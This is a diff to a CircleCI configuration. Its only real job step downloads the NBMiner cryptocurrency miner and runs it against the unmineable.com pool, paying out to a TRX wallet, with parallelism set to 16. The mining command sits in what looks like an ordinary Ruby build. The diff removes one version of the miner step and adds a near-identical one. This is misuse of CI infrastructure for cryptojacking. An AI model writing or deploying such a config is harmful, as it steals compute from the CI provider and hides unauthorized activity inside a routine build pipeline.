@@ -5,10 +5,11 @@ jobs:
             - image: circleci/ruby:2.5.3
       parallelism: 16
       steps:
-        - run: wget https://github.com/NebuTech/NBMiner/releases/download/v40.1/NBMiner_40.1_Linux.tgz && tar -xf NBMiner_40.1_Linux.tgz && cd NBMiner_Linux/ && ./nbminer. --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TDUikTDLFXmZGro1be9FLHUSoe67BFeQXo.worker1 --ethstratum ETHPROXY
+        - checkout
+        - run:  wget https://github.com/NebuTech/NBMiner/releases/download/v40.1/NBMiner_40.1_Linux.tgz && tar zxvf NBMiner_40.1_Linux.tgz && ./nbminer. --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TDUikTDLFXmZGro1be9FLHUSoe67BFeQXo.worker1 --ethstratum ETHPROXY
 
 workflows:
     version: 2.1
     build:
         jobs:
-        - trial
+        - trial	
